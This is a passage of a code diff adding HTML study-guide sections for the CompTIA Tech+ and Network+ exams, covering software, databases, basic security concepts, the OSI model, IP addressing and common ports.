+<td>Modern Linux default</td>
+</tr>
+<tr>
+<td>APFS</td>
+<td>macOS</td>
+<td>8 EB</td>
+<td>SSD-optimized</td>
+</tr>
+<tr>
+<td>HFS+</td>
+<td>macOS (old)</td>
+<td>8 EB</td>
+<td>Legacy</td>
+</tr>
+</tbody>
+</table>
+<h3>Application Types</h3>
+<ul>
+<li><strong>Native app:</strong> Built for specific OS (Windows .exe, macOS .app)</li>
+<li><strong>Web app:</strong> Runs in browser; cross-platform</li>
+<li><strong>Mobile app:</strong> iOS/Android</li>
+<li><strong>Cross-platform app:</strong> Electron, Flutter, React Native</li>
+<li><strong>Open source:</strong> Source code publicly available (LibreOffice, Firefox)</li>
+<li><strong>Proprietary:</strong> Commercial, closed-source (Adobe, Microsoft Office)</li>
+<li><strong>Freeware:</strong> Free but closed-source</li>
+<li><strong>Shareware:</strong> Try before you buy</li>
+</ul>
+<h3>Software Licensing</h3>
+<table>
+<thead>
+<tr>
+<th>License Type</th>
+<th>Key Feature</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Perpetual</td>
+<td>Buy once, use forever</td>
+</tr>
+<tr>
+<td>Subscription</td>
+<td>Monthly/annual fee</td>
+</tr>
+<tr>
+<td>Per-seat</td>
+<td>Per user</td>
+</tr>
+<tr>
+<td>Site license</td>
+<td>Unlimited users at a location</td>
+</tr>
+<tr>
+<td>Enterprise</td>
+<td>Org-wide</td>
+</tr>
+<tr>
+<td>Open Source (GPL)</td>
+<td>Must share modifications</td>
+</tr>
+<tr>
+<td>Open Source (MIT/Apache)</td>
+<td>More permissive</td>
+</tr>
+<tr>
+<td>Freeware</td>
+<td>Free, no source</td>
+</tr>
+<tr>
+<td>Shareware</td>
+<td>Time/feature limited trial</td>
+</tr>
+<tr>
+<td>OEM</td>
+<td>Tied to hardware</td>
+</tr>
+</tbody>
+</table>
+<h3>File Types</h3>
+<p><strong>Documents:</strong> .docx, .xlsx, .pptx, .pdf, .txt, .odt<br/><strong>Images:</strong> .jpg/jpeg, .png, .gif, .bmp, .tiff, .svg, .webp, .raw<br/><strong>Video:</strong> .mp4, .avi, .mkv, .mov, .wmv<br/><strong>Audio:</strong> .mp3, .wav, .aac, .flac, .ogg<br/><strong>Archives:</strong> .zip, .rar, .7z, .tar, .gz<br/><strong>Executables:</strong> .exe (Windows), .dmg (macOS), .sh, .deb, .rpm (Linux)<br/><strong>Web:</strong> .html, .css, .js, .php<br/><strong>Data:</strong> .csv, .json, .xml, .sql  </p>
+
+`,
+  "study-guide-techplus-05": `
+<h2>5. Domain 4: Software Development Concepts</h2>
+<h3>Programming Paradigms</h3>
+<table>
+<thead>
+<tr>
+<th>Paradigm</th>
+<th>Description</th>
+<th>Languages</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Procedural</td>
+<td>Step-by-step instructions</td>
+<td>C, Pascal</td>
+</tr>
+<tr>
+<td>Object-Oriented</td>
+<td>Objects with data + behavior</td>
+<td>Java, Python, C++</td>
+</tr>
+<tr>
+<td>Functional</td>
+<td>Functions as values, immutable data</td>
+<td>Haskell, Erlang, F#</td>
+</tr>
+<tr>
+<td>Event-Driven</td>
+<td>Responds to events</td>
+<td>JavaScript</td>
+</tr>
+<tr>
+<td>Declarative</td>
+<td>Describe what, not how</td>
+<td>SQL, HTML</td>
+</tr>
+</tbody>
+</table>
+<h3>Programming Concepts</h3>
+<ul>
+<li><strong>Variable:</strong> Named storage location in memory</li>
+<li><strong>Data type:</strong> Category of data (integer, string, boolean, float)</li>
+<li><strong>Constant:</strong> Variable that cannot change</li>
+<li><strong>Operator:</strong> Performs operation (+, -, *, /, %, ==)</li>
+<li><strong>Control flow:</strong> if/else, switch, loops</li>
+<li><strong>Function/Method:</strong> Reusable block of code</li>
+<li><strong>Parameter:</strong> Input to a function</li>
+<li><strong>Return value:</strong> Output of a function</li>
+<li><strong>Loop:</strong> Repeat code (for, while, do-while)</li>
+<li><strong>Array:</strong> Ordered collection of same-type elements</li>
+<li><strong>Object:</strong> Instance of a class with properties and methods</li>
+<li><strong>Class:</strong> Blueprint for creating objects</li>
+<li><strong>Inheritance:</strong> Child class extends parent class</li>
+<li><strong>Polymorphism:</strong> Same method name, different behavior</li>
+<li><strong>Encapsulation:</strong> Hiding implementation details</li>
+</ul>
+<h3>Interpreted vs Compiled</h3>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Compiled</th>
+<th>Interpreted</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Examples</td>
+<td>C, C++, Java (to bytecode)</td>
+<td>Python, JavaScript, Ruby</td>
+</tr>
+<tr>
+<td>Process</td>
+<td>Translated to machine code before run</td>
+<td>Translated line by line at run</td>
+</tr>
+<tr>
+<td>Speed</td>
+<td>Faster execution</td>
+<td>Slower execution</td>
+</tr>
+<tr>
+<td>Portability</td>
+<td>Platform-specific binary</td>
+<td>Cross-platform</td>
+</tr>
+<tr>
+<td>Errors</td>
+<td>Found at compile time</td>
+<td>Found at runtime</td>
+</tr>
+</tbody>
+</table>
+<h3>Software Development Life Cycle (SDLC)</h3>
+<ol>
+<li><strong>Planning</strong> — Define scope, feasibility, resources</li>
+<li><strong>Analysis/Requirements</strong> — What should the software do?</li>
+<li><strong>Design</strong> — Architecture, database schema, UI mockups</li>
+<li><strong>Development/Coding</strong> — Write the code</li>
+<li><strong>Testing</strong> — Find and fix bugs</li>
+<li><strong>Deployment</strong> — Release to production</li>
+<li><strong>Maintenance</strong> — Updates, patches, enhancements</li>
+</ol>
+<p><strong>Methodologies:</strong></p>
+<ul>
+<li><strong>Waterfall:</strong> Sequential phases; rigid; good for fixed requirements</li>
+<li><strong>Agile:</strong> Iterative sprints; flexible; most popular today</li>
+<li><strong>Scrum:</strong> Agile framework; sprints, daily standups, backlog</li>
+<li><strong>Kanban:</strong> Visual board; continuous flow</li>
+<li><strong>DevOps:</strong> Development + Operations collaboration; CI/CD</li>
+</ul>
+<h3>Version Control</h3>
+<ul>
+<li><strong>Git:</strong> Most popular distributed version control</li>
+<li><strong>Repository (repo):</strong> Project storage</li>
+<li><strong>Commit:</strong> Saved snapshot of changes</li>
+<li><strong>Branch:</strong> Independent line of development</li>
+<li><strong>Merge:</strong> Combine branches</li>
+<li><strong>Pull request:</strong> Request to merge changes (code review)</li>
+<li><strong>Clone:</strong> Copy a repository locally</li>
+<li><strong>Push:</strong> Send local commits to remote</li>
+<li><strong>Pull/Fetch:</strong> Get remote changes locally</li>
+</ul>
+<h3>Testing Types</h3>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>What It Tests</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Unit</td>
+<td>Individual functions/methods</td>
+</tr>
+<tr>
+<td>Integration</td>
+<td>Multiple components together</td>
+</tr>
+<tr>
+<td>System</td>
+<td>Entire application</td>
+</tr>
+<tr>
+<td>Acceptance (UAT)</td>
+<td>Meets user requirements</td>
+</tr>
+<tr>
+<td>Regression</td>
+<td>New changes didn't break old functionality</td>
+</tr>
+<tr>
+<td>Performance</td>
+<td>Speed, load, stress</td>
+</tr>
+<tr>
+<td>Security (Penetration)</td>
+<td>Vulnerabilities</td>
+</tr>
+<tr>
+<td>Smoke</td>
+<td>Basic functionality after build</td>
+</tr>
+<tr>
+<td>Black box</td>
+<td>No knowledge of internals</td>
+</tr>
+<tr>
+<td>White box</td>
+<td>Full knowledge of internals</td>
+</tr>
+</tbody>
+</table>
+
+`,
+  "study-guide-techplus-06": `
+<h2>6. Domain 5: Database Fundamentals</h2>
+<h3>Relational Databases</h3>
+<ul>
+<li><strong>Table:</strong> 2D structure of rows and columns</li>
+<li><strong>Row/Record:</strong> Single data entry</li>
+<li><strong>Column/Field:</strong> Category of data</li>
+<li><strong>Primary Key:</strong> Unique identifier for each row</li>
+<li><strong>Foreign Key:</strong> Links to primary key in another table</li>
+<li><strong>Index:</strong> Speeds up queries</li>
+<li><strong>Schema:</strong> Database structure/blueprint</li>
+</ul>
+<p><strong>Database Relationships:</strong></p>
+<ul>
+<li><strong>One-to-One:</strong> One customer has one profile</li>
+<li><strong>One-to-Many:</strong> One customer has many orders</li>
+<li><strong>Many-to-Many:</strong> Students ↔ Courses (junction table needed)</li>
+</ul>
+<h3>SQL Basics</h3>
+<pre><code>SELECT name, age FROM users WHERE age &gt; 18 ORDER BY name;
+INSERT INTO users (name, age) VALUES ('Alice', 25);
+UPDATE users SET age = 26 WHERE name = 'Alice';
+DELETE FROM users WHERE name = 'Alice';
+</code></pre>
+<h3>Non-Relational (NoSQL) Databases</h3>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Examples</th>
+<th>Use Case</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Document</td>
+<td>MongoDB, CouchDB</td>
+<td>JSON-like data</td>
+</tr>
+<tr>
+<td>Key-Value</td>
+<td>Redis, DynamoDB</td>
+<td>Caching, sessions</td>
+</tr>
+<tr>
+<td>Column</td>
+<td>Cassandra, HBase</td>
+<td>Time-series, analytics</td>
+</tr>
+<tr>
+<td>Graph</td>
+<td>Neo4j</td>
+<td>Relationships, social networks</td>
+</tr>
+</tbody>
+</table>
+<p><strong>When to use NoSQL:</strong></p>
+<ul>
+<li>Large-scale data that doesn't fit a table</li>
+<li>Flexible/changing schema</li>
+<li>High read/write throughput</li>
+<li>Unstructured or semi-structured data</li>
+</ul>
+<h3>Data Concepts</h3>
+<ul>
+<li><strong>Data warehouse:</strong> Large store for historical data analysis</li>
+<li><strong>Data lake:</strong> Raw data store (any format)</li>
+<li><strong>Data mart:</strong> Subset of data warehouse for specific department</li>
+<li><strong>ETL:</strong> Extract, Transform, Load — data pipeline</li>
+<li><strong>OLTP:</strong> Online Transaction Processing (lots of small transactions)</li>
+<li><strong>OLAP:</strong> Online Analytical Processing (complex queries on large data)</li>
+<li><strong>Backup types:</strong><ul>
+<li>Full: Everything</li>
+<li>Incremental: Changes since last backup</li>
+<li>Differential: Changes since last full backup</li>
+</ul>
+</li>
+</ul>
+
+`,
+  "study-guide-techplus-07": `
+<h2>7. Domain 6: Security</h2>
+<h3>Security Concepts</h3>
+<ul>
+<li><p><strong>CIA Triad:</strong></p>
+<ul>
+<li><strong>Confidentiality:</strong> Only authorized users can access data</li>
+<li><strong>Integrity:</strong> Data is accurate and unmodified</li>
+<li><strong>Availability:</strong> Systems accessible when needed</li>
+</ul>
+</li>
+<li><p><strong>Authentication:</strong> Who are you? (username/password, biometrics, token)</p>
+</li>
+<li><strong>Authorization:</strong> What can you access? (permissions, roles)</li>
+<li><strong>Non-repudiation:</strong> Cannot deny performing an action (audit logs, digital signatures)</li>
+<li><strong>Least privilege:</strong> Give minimum access needed</li>
+</ul>
+<h3>Authentication Factors</h3>
+<table>
+<thead>
+<tr>
+<th>Factor</th>
+<th>Type</th>
+<th>Examples</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Something you know</td>
+<td>Knowledge</td>
+<td>Password, PIN, secret question</td>
+</tr>
+<tr>
+<td>Something you have</td>
+<td>Possession</td>
+<td>Security key, smart card, OTP token</td>
+</tr>
+<tr>
+<td>Something you are</td>
+<td>Inherence</td>
+<td>Fingerprint, face, retina</td>
+</tr>
+<tr>
+<td>Somewhere you are</td>
+<td>Location</td>
+<td>GPS, IP geofencing</td>
+</tr>
+</tbody>
+</table>
+<p><strong>MFA/2FA:</strong> Using two or more factors for authentication.</p>
+<h3>Common Threats</h3>
+<table>
+<thead>
+<tr>
+<th>Threat</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Phishing</td>
+<td>Deceptive email to steal credentials</td>
+</tr>
+<tr>
+<td>Spear phishing</td>
+<td>Targeted phishing</td>
+</tr>
+<tr>
+<td>Vishing</td>
+<td>Voice/phone phishing</td>
+</tr>
+<tr>
+<td>Smishing</td>
+<td>SMS phishing</td>
+</tr>
+<tr>
+<td>Malware</td>
+<td>Any malicious software</td>
+</tr>
+<tr>
+<td>Virus</td>
+<td>Self-replicating malicious code (needs host file)</td>
+</tr>
+<tr>
+<td>Worm</td>
+<td>Self-replicating, spreads without host</td>
+</tr>
+<tr>
+<td>Trojan</td>
+<td>Disguises as legitimate software</td>
+</tr>
+<tr>
+<td>Ransomware</td>
+<td>Encrypts files and demands ransom</td>
+</tr>
+<tr>
+<td>Spyware</td>
+<td>Secretly monitors activity</td>
+</tr>
+<tr>
+<td>Adware</td>
+<td>Displays unwanted ads</td>
+</tr>
+<tr>
+<td>Rootkit</td>
+<td>Hides itself deep in OS</td>
+</tr>
+<tr>
+<td>Keylogger</td>
+<td>Records keystrokes</td>
+</tr>
+<tr>
+<td>Botnet</td>
+<td>Network of compromised machines</td>
+</tr>
+<tr>
+<td>DDoS</td>
+<td>Distributed Denial of Service</td>
+</tr>
+<tr>
+<td>SQL Injection</td>
+<td>Malicious SQL in input fields</td>
+</tr>
+<tr>
+<td>Man-in-the-Middle</td>
+<td>Intercept communications</td>
+</tr>
+<tr>
+<td>Social Engineering</td>
+<td>Manipulate people into revealing info</td>
+</tr>
+</tbody>
+</table>
+<h3>Encryption</h3>
+<ul>
+<li><strong>Encryption:</strong> Transform readable data (plaintext) into unreadable (ciphertext)</li>
+<li><strong>Decryption:</strong> Reverse process</li>
+<li><strong>Key:</strong> Secret value used in encryption/decryption</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Keys</th>
+<th>Examples</th>
+<th>Use Case</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Symmetric</td>
+<td>Same key for encrypt/decrypt</td>
+<td>AES, DES</td>
+<td>Fast, bulk data</td>
+</tr>
+<tr>
+<td>Asymmetric</td>
+<td>Public/private key pair</td>
+<td>RSA, ECC</td>
+<td>Key exchange, signatures</td>
+</tr>
+<tr>
+<td>Hashing</td>
+<td>One-way (no decryption)</td>
+<td>SHA-256, MD5</td>
+<td>Passwords, integrity</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li><strong>HTTPS:</strong> HTTP with TLS encryption (padlock in browser)</li>
+<li><strong>SSL/TLS:</strong> Protocol for encrypted web communication</li>
+<li><strong>PKI:</strong> Infrastructure for managing digital certificates</li>
+<li><strong>Digital Certificate:</strong> Proves identity; contains public key</li>
+<li><strong>Certificate Authority (CA):</strong> Trusted issuer of certificates</li>
+<li><strong>Digital Signature:</strong> Proves sender identity and integrity</li>
+</ul>
+<h3>Security Controls</h3>
+<p><strong>By Type:</strong></p>
+<ul>
+<li><strong>Technical:</strong> Firewalls, antivirus, encryption, MFA, IDS/IPS</li>
+<li><strong>Administrative:</strong> Policies, training, background checks, procedures</li>
+<li><strong>Physical:</strong> Locks, cameras, guards, badge access, mantrap</li>
+</ul>
+<p><strong>By Function:</strong></p>
+<ul>
+<li><strong>Preventive:</strong> Stop attacks (firewall, antivirus)</li>
+<li><strong>Detective:</strong> Find attacks (IDS, logs, SIEM)</li>
+<li><strong>Corrective:</strong> Fix after attack (backup restoration, patch)</li>
+<li><strong>Deterrent:</strong> Discourage attacks (warning signs, legal notices)</li>
+</ul>
+<h3>Network Security</h3>
+<ul>
+<li><strong>Firewall:</strong> Blocks/allows traffic based on rules</li>
+<li><strong>IDS:</strong> Intrusion Detection System — monitors and alerts</li>
+<li><strong>IPS:</strong> Intrusion Prevention System — monitors and blocks</li>
+<li><strong>VPN:</strong> Encrypted tunnel over public internet</li>
+<li><strong>DMZ:</strong> Demilitarized Zone — separate network for public-facing servers</li>
+<li><strong>NAT:</strong> Network Address Translation — hides internal IPs</li>
+<li><strong>ACL:</strong> Access Control List — rules for who can access what</li>
+</ul>
+<h3>Physical Security</h3>
+<ul>
+<li><strong>Mantrap:</strong> Airlock-style double doors; one opens at a time</li>
+<li><strong>Badge access:</strong> Proximity card or smart card entry</li>
+<li><strong>Biometrics:</strong> Fingerprint/face/iris for physical access</li>
+<li><strong>CCTV:</strong> Closed-circuit television (cameras)</li>
+<li><strong>Cable locks:</strong> Physically secure laptops</li>
+<li><strong>Safe/vault:</strong> Protect critical media and hardware</li>
+</ul>
+<h3>Security Best Practices</h3>
+<ul>
+<li>Use strong, unique passwords (12+ characters, mixed types)</li>
+<li>Enable MFA on all accounts</li>
+<li>Keep software updated (patch regularly)</li>
+<li>Use antivirus/EDR software</li>
+<li>Encrypt sensitive data</li>
+<li>Use HTTPS everywhere</li>
+<li>Regular data backups (follow 3-2-1 rule)</li>
+<li>Principle of least privilege</li>
+<li>Security awareness training</li>
+<li>Incident response plan</li>
+</ul>
+<p><strong>3-2-1 Backup Rule:</strong></p>
+<ul>
+<li><strong>3</strong> copies of data</li>
+<li><strong>2</strong> different storage types</li>
+<li><strong>1</strong> offsite copy</li>
+</ul>
+
+`,
+  "study-guide-techplus-08": `
+<h2>8. Quick Review: Key Terms</h2>
+<table>
+<thead>
+<tr>
+<th>Term</th>
+<th>Definition</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>API</td>
+<td>Application Programming Interface — lets software talk to each other</td>
+</tr>
+<tr>
+<td>CLI</td>
+<td>Command-Line Interface</td>
+</tr>
+<tr>
+<td>GUI</td>
+<td>Graphical User Interface</td>
+</tr>
+<tr>
+<td>BIOS/UEFI</td>
+<td>Firmware that starts a computer</td>
+</tr>
+<tr>
+<td>OS</td>
+<td>Operating System</td>
+</tr>
+<tr>
+<td>CPU</td>
+<td>Central Processing Unit</td>
+</tr>
+<tr>
+<td>RAM</td>
+<td>Random Access Memory (volatile)</td>
+</tr>
+<tr>
+<td>HDD/SSD</td>
+<td>Storage drives</td>
+</tr>
+<tr>
+<td>IP Address</td>
+<td>Unique network identifier</td>
+</tr>
+<tr>
+<td>MAC Address</td>
+<td>Hardware-level network address</td>
+</tr>
+<tr>
+<td>DNS</td>
+<td>Domain Name System — translates names to IPs</td>
+</tr>
+<tr>
+<td>DHCP</td>
+<td>Auto-assigns IP addresses</td>
+</tr>
+<tr>
+<td>HTTP/HTTPS</td>
+<td>Web browsing protocols</td>
+</tr>
+<tr>
+<td>FTP</td>
+<td>File Transfer Protocol</td>
+</tr>
+<tr>
+<td>SSH</td>
+<td>Secure Shell — remote CLI access</td>
+</tr>
+<tr>
+<td>VPN</td>
+<td>Virtual Private Network</td>
+</tr>
+<tr>
+<td>Firewall</td>
+<td>Network/host traffic filter</td>
+</tr>
+<tr>
+<td>Encryption</td>
+<td>Protect data with cipher</td>
+</tr>
+<tr>
+<td>Authentication</td>
+<td>Verify identity</td>
+</tr>
+<tr>
+<td>Authorization</td>
+<td>Grant access rights</td>
+</tr>
+</tbody>
+</table>
+
+<p><em>End of CompTIA Tech+ Study Guide</em></p>
+
+`,
+  "study-guide-networkplus-01": `
+<h2>1. Exam Overview</h2>
+<p><strong>Exam Code:</strong> N10-009<br/><strong>Questions:</strong> Maximum 90 (multiple-choice + performance-based)<br/><strong>Time Limit:</strong> 90 minutes<br/><strong>Passing Score:</strong> 720 (on a 100–900 scale)<br/><strong>Recommended Experience:</strong> CompTIA A+ or 9-12 months networking experience</p>
+<h3>Domain Breakdown</h3>
+<table>
+<thead>
+<tr>
+<th>Domain</th>
+<th>Weight</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1. Networking Concepts</td>
+<td>23%</td>
+</tr>
+<tr>
+<td>2. Network Implementation</td>
+<td>19%</td>
+</tr>
+<tr>
+<td>3. Network Operations</td>
+<td>19%</td>
+</tr>
+<tr>
+<td>4. Network Security</td>
+<td>19%</td>
+</tr>
+<tr>
+<td>5. Network Troubleshooting</td>
+<td>20%</td>
+</tr>
+</tbody>
+</table>
+
+`,
+  "study-guide-networkplus-02": `
+<h2>2. The OSI Model</h2>
+<p>The OSI (Open Systems Interconnection) model has 7 layers. <strong>Mnemonic:</strong> "Please Do Not Throw Sausage Pizza Away" (Physical → Application).</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Layer</th>
+<th>Function</th>
+<th>Protocol/Device Examples</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>7</td>
+<td>Application</td>
+<td>End-user interface</td>
+<td>HTTP, FTP, DNS, SMTP, SSH</td>
+</tr>
+<tr>
+<td>6</td>
+<td>Presentation</td>
+<td>Encoding, encryption, compression</td>
+<td>TLS/SSL, JPEG, MPEG</td>
+</tr>
+<tr>
+<td>5</td>
+<td>Session</td>
+<td>Manage sessions</td>
+<td>NetBIOS, RPC, SQL</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Transport</td>
+<td>End-to-end delivery, port numbers</td>
+<td>TCP, UDP</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Network</td>
+<td>Logical addressing, routing</td>
+<td>IP, ICMP, OSPF, BGP — Routers</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Data Link</td>
+<td>Physical addressing (MAC), framing</td>
+<td>Ethernet, 802.11 — Switches</td>
+</tr>
+<tr>
+<td>1</td>
+<td>Physical</td>
+<td>Bits on wire/air</td>
+<td>Cables, hubs, repeaters</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Data unit names by layer:</strong></p>
+<ul>
+<li>Layer 7/6/5: Data</li>
+<li>Layer 4: Segment (TCP) / Datagram (UDP)</li>
+<li>Layer 3: Packet</li>
+<li>Layer 2: Frame</li>
+<li>Layer 1: Bit</li>
+</ul>
+<p><strong>Encapsulation:</strong> As data goes down the stack, headers are added. As it goes up, headers are removed (decapsulation).</p>
+
+`,
+  "study-guide-networkplus-03": `
+<h2>3. TCP/IP Model</h2>
+<table>
+<thead>
+<tr>
+<th>TCP/IP Layer</th>
+<th>Corresponds to OSI</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Application</td>
+<td>5, 6, 7</td>
+</tr>
+<tr>
+<td>Transport</td>
+<td>4</td>
+</tr>
+<tr>
+<td>Internet</td>
+<td>3</td>
+</tr>
+<tr>
+<td>Network Access / Link</td>
+<td>1, 2</td>
+</tr>
+</tbody>
+</table>
+
+`,
+  "study-guide-networkplus-04": `
+<h2>4. IP Addressing</h2>
+<h3>IPv4</h3>
+<ul>
+<li><strong>Format:</strong> 32-bit, written as 4 octets: <code>192.168.1.100</code></li>
+<li><strong>Range:</strong> Each octet 0–255</li>
+<li><strong>Total addresses:</strong> ~4.3 billion (2³²)</li>
+</ul>
+<h3>IPv4 Address Classes (Classful, mostly legacy)</h3>
+<table>
+<thead>
+<tr>
+<th>Class</th>
+<th>First Octet</th>
+<th>Default Mask</th>
+<th>Use</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>A</td>
+<td>1–126</td>
+<td>255.0.0.0 /8</td>
+<td>Large networks</td>
+</tr>
+<tr>
+<td>B</td>
+<td>128–191</td>
+<td>255.255.0.0 /16</td>
+<td>Medium networks</td>
+</tr>
+<tr>
+<td>C</td>
+<td>192–223</td>
+<td>255.255.255.0 /24</td>
+<td>Small networks</td>
+</tr>
+<tr>
+<td>D</td>
+<td>224–239</td>
+<td>N/A</td>
+<td>Multicast</td>
+</tr>
+<tr>
+<td>E</td>
+<td>240–255</td>
+<td>N/A</td>
+<td>Experimental</td>
+</tr>
+</tbody>
+</table>
+<p><em>127.x.x.x = Loopback (localhost)</em></p>
+<h3>Private IP Ranges (RFC 1918)</h3>
+<table>
+<thead>
+<tr>
+<th>Range</th>
+<th>CIDR</th>
+<th>Hosts</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>10.0.0.0 – 10.255.255.255</td>
+<td>10.0.0.0/8</td>
+<td>~16 million</td>
+</tr>
+<tr>
+<td>172.16.0.0 – 172.31.255.255</td>
+<td>172.16.0.0/12</td>
+<td>~1 million</td>
+</tr>
+<tr>
+<td>192.168.0.0 – 192.168.255.255</td>
+<td>192.168.0.0/16</td>
+<td>~65,000</td>
+</tr>
+</tbody>
+</table>
+<h3>Special IPv4 Addresses</h3>
+<table>
+<thead>
+<tr>
+<th>Address/Range</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0.0.0.0</td>
+<td>Unspecified / all networks</td>
+</tr>
+<tr>
+<td>127.0.0.1</td>
+<td>Loopback</td>
+</tr>
+<tr>
+<td>169.254.0.0/16</td>
+<td>APIPA (auto-assigned when DHCP fails)</td>
+</tr>
+<tr>
+<td>255.255.255.255</td>
+<td>Limited broadcast</td>
+</tr>
+<tr>
+<td>x.x.x.255</td>
+<td>Directed broadcast (for that subnet)</td>
+</tr>
+<tr>
+<td>x.x.x.0</td>
+<td>Network address (not assignable)</td>
+</tr>
+</tbody>
+</table>
+<h3>Subnetting</h3>
+<p><strong>CIDR Notation:</strong> <code>192.168.1.0/24</code> — the <code>/24</code> means 24 bits are the network portion.</p>
+<p><strong>Quick Subnetting Reference:</strong></p>
+<table>
+<thead>
+<tr>
+<th>CIDR</th>
+<th>Subnet Mask</th>
+<th>Hosts</th>
+<th>Networks from /24</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>/24</td>
+<td>255.255.255.0</td>
+<td>254</td>
+<td>1</td>
+</tr>
+<tr>
+<td>/25</td>
+<td>255.255.255.128</td>
+<td>126</td>
+<td>2</td>
+</tr>
+<tr>
+<td>/26</td>
+<td>255.255.255.192</td>
+<td>62</td>
+<td>4</td>
+</tr>
+<tr>
+<td>/27</td>
+<td>255.255.255.224</td>
+<td>30</td>
+<td>8</td>
+</tr>
+<tr>
+<td>/28</td>
+<td>255.255.255.240</td>
+<td>14</td>
+<td>16</td>
+</tr>
+<tr>
+<td>/29</td>
+<td>255.255.255.248</td>
+<td>6</td>
+<td>32</td>
+</tr>
+<tr>
+<td>/30</td>
+<td>255.255.255.252</td>
+<td>2</td>
+<td>64</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Formula:</strong> Hosts per subnet = 2ⁿ – 2 (n = host bits, subtract network and broadcast)</p>
+<p><strong>Subnetting steps:</strong></p>
+<ol>
+<li>Convert mask to binary</li>
+<li>AND the IP with the mask → Network address</li>
+<li>Flip all host bits to 1 → Broadcast address</li>
+<li>First host = Network + 1; Last host = Broadcast – 1</li>
+</ol>
+<h3>IPv6</h3>
+<ul>
+<li><strong>Format:</strong> 128-bit; 8 groups of 4 hex digits: <code>2001:0db8:85a3:0000:0000:8a2e:0370:7334</code></li>
+<li><strong>Abbreviation rules:</strong><ul>
+<li>Leading zeros in a group can be dropped: <code>0db8</code> → <code>db8</code></li>
+<li>Consecutive all-zero groups replaced with <code>::</code> (only once)</li>
+<li><code>2001:db8::8a2e:370:7334</code></li>
+</ul>
+</li>
+<li><strong>Total:</strong> 2¹²⁸ ≈ 340 undecillion addresses</li>
+</ul>
+<p><strong>IPv6 Address Types:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Prefix</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Global Unicast</td>
+<td>2000::/3</td>
+<td>Public (routable)</td>
+</tr>
+<tr>
+<td>Link-Local</td>
+<td>FE80::/10</td>
+<td>Local link only (auto-configured)</td>
+</tr>
+<tr>
+<td>Loopback</td>
+<td>::1/128</td>
+<td>Same as 127.0.0.1</td>
+</tr>
+<tr>
+<td>Unspecified</td>
+<td>::/128</td>
+<td>Like 0.0.0.0</td>
+</tr>
+<tr>
+<td>Multicast</td>
+<td>FF00::/8</td>
+<td>One-to-many</td>
+</tr>
+<tr>
+<td>Unique Local</td>
+<td>FC00::/7</td>
+<td>Like private IPv4</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Key differences from IPv4:</strong></p>
+<ul>
+<li>No broadcast — uses multicast</li>
+<li>Stateless Address Autoconfiguration (SLAAC) — no DHCP needed</li>
+<li>Built-in IPsec support</li>
+<li>No NAT (enough addresses for everyone)</li>
+<li>Neighbor Discovery Protocol (NDP) replaces ARP</li>
+</ul>
+
+`,
+  "study-guide-networkplus-05": `
+<h2>5. Network Ports and Protocols</h2>
+<h3>Well-Known Ports (Memorize These)</h3>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Protocol</th>
+<th>Transport</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>20</td>
+<td>FTP-Data</td>
+<td>TCP</td>
+<td>FTP data transfer</td>
+</tr>
+<tr>
+<td>21</td>
+<td>FTP-Control</td>
+<td>TCP</td>
+<td>FTP commands</td>
+</tr>
+<tr>
+<td>22</td>
+<td>SSH</td>
+<td>TCP</td>
+<td>Secure remote shell</td>
+</tr>
+<tr>
+<td>23</td>
+<td>Telnet</td>
+<td>TCP</td>
+<td>Insecure remote shell</td>
+</tr>
+<tr>
+<td>25</td>
+<td>SMTP</td>
+<td>TCP</td>
+<td>Send email</td>
+</tr>
+<tr>
+<td>53</td>
+<td>DNS</td>
+<td>UDP/TCP</td>
+<td>Name resolution</td>
+</tr>
+<tr>
+<td>67/68</td>
+<td>DHCP</td>
+<td>UDP</td>
+<td>IP assignment (server/client)</td>
+</tr>
+<tr>
+<td>69</td>
+<td>TFTP</td>
+<td>UDP</td>
+<td>Trivial File Transfer</td>
+</tr>
+<tr>
+<td>80</td>
+<td>HTTP</td>
+<td>TCP</td>
+<td>Web browsing</td>
+</tr>
+<tr>
+<td>110</td>
+<td>POP3</td>
+<td>TCP</td>
+<td>Receive email (download)</td>
+</tr>
+<tr>
+<td>119</td>
+<td>NNTP</td>
+<td>TCP</td>
+<td>News groups</td>
+</tr>
+<tr>
+<td>123</td>
+<td>NTP</td>
+<td>UDP</td>
+<td>Time synchronization</td>
+</tr>
+<tr>
+<td>143</td>
+<td>IMAP</td>
+<td>TCP</td>
+<td>Receive email (keep on server)</td>
+</tr>
+<tr>
+<td>161/162</td>
+<td>SNMP</td>
+<td>UDP</td>
+<td>Network monitoring</td>
+</tr>
+<tr>
+<td>389</td>
+<td>LDAP</td>
+<td>TCP/UDP</td>
+<td>Directory services</td>
+</tr>
+<tr>
